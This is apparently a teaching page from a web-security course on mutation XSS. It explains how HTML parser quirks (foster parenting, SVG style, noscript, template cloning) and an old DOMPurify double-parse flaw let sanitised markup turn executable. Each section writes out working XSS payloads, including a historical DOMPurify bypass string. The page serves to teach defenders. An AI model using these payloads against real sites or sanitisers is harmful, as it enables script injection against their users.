Attack Demo 09 — Mutation XSS (mXSS)

Module 13 · The sanitiser approved it. The browser changed it. The payload fired anyway.

01 What is mXSS? — the serialise/parse gap CONCEPT
mXSS (Mutation XSS) occurs when:

1. A sanitiser processes HTML string S and produces a clean output S'
2. S' is inserted into the DOM via innerHTML
3. The browser's HTML parser mutates S' into a different DOM tree S''
4. S'' contains executable content that S' did not

The sanitiser and the browser disagree on how to parse the same string. This gap is caused by the HTML5 parser's context-dependent rules: the same string parses differently depending on whether it is in the HTML namespace, SVG namespace, inside a table, inside a noscript element, or inside a template.

02 Table foster parenting — content escapes its container FOSTER PARENTING
Foster parenting is the HTML5 parser rule that handles elements which are not valid inside a <table>. Instead of rejecting them, the parser moves them to just before the table element in the document. This is called "foster parenting" — the table adopts the misplaced content's position. 
Input to sanitiser:  <table><img src=x onerror=alert(1)></table>
Sanitiser sees:      img inside table — looks contained, no script tags
Passes sanitiser as: <table><img src=x onerror=alert(1)></table>

Browser innerHTML:   <img src=x onerror=alert(1)><table></table>
                     ↑ img moved BEFORE table via foster parenting
                     ↑ onerror fires in document body context

03 SVG/HTML namespace boundary — style as raw text vs markup NAMESPACE
Inside an SVG element, <style> content is treated as raw text (CDATA) — the parser does not look for HTML tags inside it. When the SVG is serialised and re-inserted into HTML context via innerHTML, the <style> closes at the first </style> token, and everything after it is parsed as HTML markup. 
Payload: <svg><style></style><img src=x onerror=alert(1)></svg>

In SVG namespace: style content = everything until </style> = empty
After </style>: <img src=x onerror=alert(1)> is HTML inside SVG
→ SVG allows HTML elements via foreignObject context
→ img onerror fires

Classic DOMPurify bypass (historical):
<svg><style><a id="</style><img src=x onerror=alert(1)>">
SVG style sees:  <a id="</style><img src=x onerror=alert(1)>">  as text
Serialised as:   <svg><style><a id="</style><img…>
Re-parsed HTML:  style ends at first </style>, img is markup

04 <noscript> parsing — scripting context disagreement NOSCRIPT
<noscript> content is parsed in two completely different modes depending on whether scripting is enabled in the parser:

Scripting ON: <noscript> content is raw text — tags inside are not parsed as HTML markup.
Scripting OFF: <noscript> content is full HTML — tags inside execute as normal markup.

A sanitiser library that runs with scripting disabled sees noscript content as HTML and sanitises it. When served to a browser with scripting enabled, the noscript content is raw text — the sanitiser's parsing model was wrong for the target environment. The bypass works in the opposite direction too. 
Payload: <noscript><p title="</noscript><img src=x onerror=alert(1)>">

Sanitiser (scripting OFF):
  Parses noscript as HTML. Sees <p title="...>
  Sanitises and passes as safe.

Browser (scripting ON):
  noscript = raw text. Entire content = string.
  Re-parsed via innerHTML: noscript ends at </noscript>.
  Remaining: <img src=x onerror=alert(1)> is now HTML.
  onerror fires.

05 <template> inert vs active context TEMPLATE
The HTML <template> element's content is parsed into a document fragment — an inert, disconnected subtree. Scripts and event handlers inside a template are not executed when the template element is created or when it is inserted into the DOM as a template element.

However, when template content is cloned and appended to the document (template.content.cloneNode(true)), the cloned nodes become part of the live document and their event handlers activate. 
Step 1: <template><img src=x onerror=alert(1)></template>
  → Parsed. onerror does NOT fire. Content is in inert fragment.

Step 2: document.body.appendChild(template.content.cloneNode(true))
  → img is now in live document.
  → src=x fails. onerror fires. alert(1).

06 innerHTML readback — the DOMPurify double-parse problem DOMPURIFY
DOMPurify's historical vulnerability to mXSS: DOMPurify (before the fix in v2.0.17 and v3.x) inserted user HTML into a detached DOM node, read back the innerHTML, and sanitised the result. The problem: the first innerHTML insertion could mutate the HTML, and the readback produced a different string — which, when inserted into the real document, had already escaped sanitisation. 
DOMPurify (old flow):
1. div.innerHTML = userInput       ← mutation may occur here
2. sanitise(div.innerHTML)         ← sanitiser sees mutated HTML
3. target.innerHTML = sanitised    ← insertion of "safe" mutated string

The mutation in step 1 produces a string that looks safe to the sanitiser
in step 2, but when re-inserted in step 3, the browser's parser re-mutates
it back into a form that contains executable content.
Simulate the double-parse
Pass 1: innerHTML readback (what sanitiser sees)
Pass 2: re-insert pass1 via innerHTML, read back again
The fix: Modern DOMPurify uses a two-pass sanitisation: apply rules, re-parse, re-apply rules, and only accept output when two consecutive passes produce identical serialised HTML. This ensures the sanitiser's model matches the browser's final parse.
